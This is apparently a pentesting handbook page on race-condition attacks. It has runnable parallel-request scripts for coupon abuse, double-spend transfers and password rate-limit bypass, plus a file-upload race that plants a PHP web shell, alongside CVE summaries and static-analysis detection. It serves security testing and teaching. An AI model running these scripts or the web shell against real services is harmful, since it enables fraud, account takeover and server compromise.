# Race Conditions

Race conditions occur when the timing of actions affects the outcome, allowing attackers to exploit the gap between check and use operations.

## Concepts

### Time-of-Check to Time-of-Use (TOCTOU)

```
Normal flow:
1. Check: Is user balance >= $100?
2. Use: Deduct $100 from balance

Attack:
1. Send 10 parallel requests to buy $100 item
2. All checks happen before any deductions
3. All 10 purchases succeed with only $100 balance
```

A real-world TOCTOU vulnerability was discovered in the Linux kernel's exec system calls (CVE-2024-43882). The executability permissions were checked at a different time than the set-user-ID bit was applied. By continuously changing permissions between a set-user-ID binary and an executable binary, an attacker could execute a program while its mode was changing, leading to privilege escalation. Debian packages like `telnetd-ssl` that transition binaries from 0755 to 04754 during installation were found to be exploitable .

### Common Vulnerable Operations

| Operation                 | Attack Goal                     |
| ------------------------- | ------------------------------- |
| Money transfers           | Double-spend, overdraft         |
| Coupon/voucher redemption | Multiple use of single-use code |
| Rate limiting             | Bypass request limits           |
| File upload               | Overwrite during processing     |
| Inventory/stock           | Purchase more than available    |
| Vote/like systems         | Multiple votes                  |
| Account creation          | Duplicate accounts              |

## Testing Tools

### Turbo Intruder (Burp Suite)

```python
# Basic race condition script
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=30,
                          requestsPerConnection=100,
                          pipeline=True)
    
    # Queue same request multiple times
    for i in range(30):
        engine.queue(target.req)

def handleResponse(req, interesting):
    table.add(req)
```

```python
# Single-packet attack (most effective)
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1,
                          requestsPerConnection=100,
                          pipeline=False)
    
    # Send all requests in single TCP packet
    for i in range(20):
        engine.queue(target.req, gate='race1')
    
    # Release all at once
    engine.openGate('race1')
```

### race-the-web

```bash
# https://github.com/TheHackerDev/race-the-web
# Configure in config.toml

[[targets]]
method = "POST"
url = "https://target.com/api/transfer"
body = '{"amount": 100, "to": "attacker"}'
cookies = "session=abc123"
count = 100

# Run
race-the-web config.toml
```

### Custom Python Script

```python
import asyncio
import aiohttp

async def send_request(session, url, data, headers):
    async with session.post(url, data=data, headers=headers) as response:
        return await response.text()

async def race_condition_test(url, data, headers, count=50):
    async with aiohttp.ClientSession() as session:
        tasks = [send_request(session, url, data, headers) for _ in range(count)]
        responses = await asyncio.gather(*tasks)
        return responses

# Run
url = "https://target.com/api/redeem"
data = {"code": "DISCOUNT50"}
headers = {"Cookie": "session=abc123", "Content-Type": "application/json"}

responses = asyncio.run(race_condition_test(url, data, headers, 100))
print(f"Success count: {responses.count('success')}")
```

### curl Parallel Requests

```bash
# Using GNU Parallel
seq 1 50 | parallel -j 50 "curl -s -X POST 'https://target.com/redeem' \
  -H 'Cookie: session=abc123' \
  -d 'code=SINGLE-USE'"

# Using xargs
printf 'https://target.com/redeem\n%.0s' {1..50} | \
  xargs -P 50 -I {} curl -s -X POST {} -H 'Cookie: session=abc123'

# Using bash backgrounding
for i in {1..50}; do
  curl -s -X POST "https://target.com/redeem" \
    -H "Cookie: session=abc123" \
    -d "code=DISCOUNT" &
done
wait
```

## Attack Scenarios

### Coupon/Discount Code Abuse

```http
POST /api/apply-coupon HTTP/1.1
Host: target.com
Cookie: session=abc123
Content-Type: application/json

{"coupon": "50OFF", "cart_id": "12345"}
```

```python
# Turbo Intruder - apply coupon multiple times
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=20,
                          requestsPerConnection=1,
                          pipeline=False)
    
    for i in range(20):
        engine.queue(target.req, gate='race')
    
    engine.openGate('race')
```

### Money Transfer Double-Spend

```python
# Transfer same funds to multiple accounts simultaneously
import threading
import requests

def transfer(to_account):
    requests.post("https://bank.com/transfer", 
                  data={"to": to_account, "amount": 1000},
                  cookies={"session": "victim_session"})

threads = []
for account in ["attacker1", "attacker2", "attacker3"]:
    t = threading.Thread(target=transfer, args=(account,))
    threads.append(t)

# Start all threads simultaneously
for t in threads:
    t.start()
```

### Rate Limit Bypass

```bash
# Send many requests before rate limit kicks in
# All arrive within same time window
for i in {1..100}; do
  curl -s "https://target.com/api/check-password?password=attempt$i" &
done
wait
```

### File Upload Race

```python
# Upload file and access before validation deletes it
import threading
import requests

def upload():
    files = {'file': ('shell.php', '<?php system($_GET["cmd"]); ?>')}
    requests.post("https://target.com/upload", files=files)

def access():
    for _ in range(100):
        r = requests.get("https://target.com/uploads/shell.php?cmd=id")
        if "uid=" in r.text:
            print("SUCCESS:", r.text)
            break

# Run simultaneously
t1 = threading.Thread(target=upload)
t2 = threading.Thread(target=access)
t1.start()
t2.start()
```

### Inventory/Stock Manipulation

```http
POST /api/purchase HTTP/1.1
Host: store.com
Cookie: session=abc123

{"item_id": 1, "quantity": 1}
```

```
Scenario: Only 1 item in stock
1. Send 10 parallel purchase requests
2. All check "is stock >= 1?" before any decrement
3. Multiple purchases succeed
```

**Real-World Example (CVE-2024-53476):** SimplCommerce was affected by a race condition vulnerability in the checkout logic, allowing multiple users to purchase more products than are in stock via simultaneous checkout requests. An attacker could detect this by attempting to purchase a product with limited stock (stock = 1) using two accounts concurrently. If both accounts successfully purchase the product, the presence of a race condition is confirmed .

### OAuth State Race

```
1. Initiate OAuth flow, get state token
2. Send multiple parallel callbacks with same state
3. State may be accepted multiple times
4. Link multiple attacker accounts to victim's OAuth
```

## Detection Indicators

```
Signs of vulnerability:
- Operations involving balance/inventory checks
- Single-use tokens/codes
- Any "check then act" pattern
- Lack of database transactions
- Missing row-level locking

Signs during testing:
- Inconsistent results with parallel requests
- Balance going negative
- Stock going negative
- Multiple redemptions of single-use items
```

## Advanced Techniques

### Single Packet Attack

```python
# Most effective - all requests in one TCP packet
# Turbo Intruder with HTTP/2 single-packet mode

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1,
                          engine=Engine.BURP2)
    
    # Queue requests
    for i in range(20):
        engine.queue(target.req, gate='race')
    
    # Sync release - all in single packet
    engine.openGate('race')
```

### Last-Byte Synchronization

```
1. Send all requests except last byte
2. Server holds connections waiting
3. Send all final bytes simultaneously
4. Requests processed at same instant
```

### HTTP/2 Multiplexing

```python
# Use HTTP/2 to send multiple requests on single connection
# All frames arrive together, processed together

import httpx

async def h2_race():
    async with httpx.AsyncClient(http2=True) as client:
        tasks = [client.post("https://target.com/api/action") for _ in range(20)]
        responses = await asyncio.gather(*tasks)
```

### First Sequence Sync (Beyond 65,535 Byte Limit)

The single-packet attack traditionally limits synchronized requests to 20-30 due to TCP's 1,500-byte soft limit. However, a technique called "First Sequence Sync" overcomes this limitation by combining IP fragmentation and TCP sequence number manipulation .

**Technical Breakdown:**

1.  **IP Fragmentation:** A single TCP packet can be split into multiple IP packets. Since fragmented IP packets are not passed to the TCP layer until all fragments are received, a large TCP packet up to 65,535 bytes can be synchronized.

2.  **TCP Sequence Number Reordering:** TCP guarantees packet ordering via sequence numbers. If packets are received out-of-order (B, C, then A), the server waits for the missing packet with the first sequence number before processing any of them.

3.  **The Attack Flow:**
    - Establish TCP connection and open HTTP/2 streams
    - Send all request data except the last byte of each request
    - Create large TCP packets containing the last bytes of multiple requests
    - Send these packets using IP fragmentation, but withhold the TCP packet with the first sequence number
    - Server buffers the out-of-order packets
    - Finally send the packet with the first sequence number
    - Server processes all requests simultaneously

**Performance Metrics:** In testing across geographically distributed servers (250ms latency), this technique successfully synchronized 10,000 requests in approximately 166ms, or 0.0166ms per request. This bypasses rate limiting mechanisms that would otherwise restrict authentication attempts to 5-10 tries .

**Limitations:** The server's `SETTINGS_MAX_CONCURRENT_STREAMS` setting in HTTP/2 restricts simultaneous streams:
- Apache httpd: 100
- Nginx: 128
- Go: 250
- nghttp2: 4,294,967,295 (unlimited)

**Real-World Application:** This technique can bypass one-time token authentication rate limiting. A demonstration showed that while a server limited authentication attempts to 5 times, the client successfully performed 1,000 attempts using First Sequence Sync .

### Gift Card Balance Overdrawn (CVE-2024-58248)

**Vulnerability:** A race condition in nopCommerce's gift card processing allowed repeated redemption of single-use gift cards .

**Exploitation Method:**
1.  Attacker initiates two separate sessions, adding items to cart in each
2.  Same gift card code entered in both sessions
3.  Both sessions navigate to checkout page simultaneously
4.  Requests to `/checkout/OpcConfirmOrder/` endpoint are intercepted
5.  When processed in parallel, each request checks the gift card balance before either updates it
6.  Result: Balance is overdrawn, allowing multiple purchases using a single card

**Single-Packet Attack Application:** The researchers used the single-packet attack technique (initially developed by James Kettle at PortSwigger) to ensure both requests arrived at the server almost simultaneously. By withholding the last bytes of each request and sending them in a single TCP packet, network jitter was minimized, making the race condition exploitation feasible .

**Detection Challenge:** The researchers noted that race conditions often only occur under particular timing or load conditions, making them difficult to reproduce consistently. Tests may pass 999 times and fail unpredictably on the 1000th attempt. Additionally, debugging or logging can mask the bug, creating "Heisenbugs" .

## Static Analysis for Race Condition Detection

Modern static analysis tools can identify potential race conditions before exploitation:

### RacerD (Facebook Infer)

RacerD statically analyzes Java, C++, and Objective-C code for concurrency bugs. It detects three main warning types :

1.  **Unprotected Write:** When one or more writes can run in parallel without synchronization (write-write races)

2.  **Read/Write Race:** When reads occur concurrently with writes, potentially reading inconsistent state

3.  **Interface Not Thread-Safe:** When an interface lacks `@ThreadSafe` annotation, potentially allowing non-thread-safe implementations to be used in concurrent contexts

**Annotations for Analysis:**
- `@ThreadSafe`: Signals RacerD to check all methods in the class
- `@ThreadConfined`: Indicates a method/field is only accessed on a single thread
- `@Functional`: Marks benign races where functions always return the same value
- `@ReturnsOwnership`: Indicates an object is owned by the current thread, preventing false positives on newly allocated objects

### Context-Sensitive Outlier-Based Static Analysis

Recent research (2024) proposes a novel static analysis technique for finding kernel race conditions. Unlike traditional lockset analysis, this method infers rules for how field accesses should be locked, then checks code against these rules. This outlier-based approach scales well to large codebases like the Linux kernel. When evaluated on Linux v5.14.11, maintainers confirmed 24 previously unknown bugs .

## Kernel-Level Race Conditions

### CVE-2025-40039: ksmbd Race Condition in RPC Handle List Access

A race condition was discovered in the Linux kernel's ksmbd (SMB server) implementation. The vulnerability involved improper locking when accessing RPC handle lists :

**Flawed Implementation:**
- `ksmbd_session_rpc_open()` acquired only a read lock before calling `xa_store()` and `xa_erase()` (modifying operations requiring write locks)
- `ksmbd_session_rpc_method()` accessed the list with `xa_load()` without holding any lock

**Consequences:**
- Potential data corruption from concurrent modifications
- Possible use-after-free if an entry is concurrently removed and the pointer dereferenced
- Denial of service (CVSS 5.5, Medium severity)

**Fix:** Use `down_write()`/`up_write()` for modifications and add `down_read()`/`up_read()` for protected lookups.

### CVE-2025-54550: Apache Airflow RCE via Race Condition

A race condition in Apache Airflow's example `example_xcom` DAG could be exploited for remote code execution. The vulnerability stemmed from an unsafe pattern of reading values from XCom that could be exploited by UI users with XCom modification access to perform arbitrary code execution on workers .

**Affected Versions:** Apache Airflow < 3.2.0

**Mitigation:** Documentation in Airflow 3.2.0 contains improved resilience patterns. Users who followed the unsafe pattern are advised to adjust implementations accordingly.

### RUSTSEC-2023-0018: TOCTOU in remove_dir_all Crate

The `remove_dir_all` Rust crate contained a TOCTOU race condition enabling symlink attacks. A privileged process performing recursive deletion in an attacker-controlled directory could be tricked into deleting privileged files .

**Attack Scenario:**
1.  Process calls `remove_dir_all("a")`
2.  Before deletion starts, attacker moves `"a"` to `"a-prime"`
3.  Attacker replaces `"a"` with a symlink to `/`
4.  Privileged process deletes `/etc` instead of `a/etc`

**Fix:** Version 0.8.0 uses file-handle relative operations, opening paths relative to a directory file descriptor, making the deletion robust against directory hierarchy manipulation.

## Tools & Resources

```bash
# Turbo Intruder (Burp Extension)
# Best for race conditions

# race-the-web
https://github.com/TheHackerDev/race-the-web

# racepwn
https://github.com/AhmedMohamedDev/racepwn

# Burp Suite timing features
# Repeater → Send group in parallel

# RacerD (Static Analysis)
infer --racerd-only --bufferoverrun -- ./compile_command.json

# References
https://portswigger.net/research/smashing-the-state-machine
https://portswigger.net/research/the-single-packet-attack-making-remote-race-conditions-local
```

## Related Topics

*   [IDOR](https://www.pentest-book.com/enumeration/web/idor) - Often chains with race conditions
*   [API Security](https://www.pentest-book.com/enumeration/web/api-security) - APIs commonly vulnerable
*   [Authentication Bypass](https://www.pentest-book.com/enumeration/web/bruteforcing) - Rate limit bypass
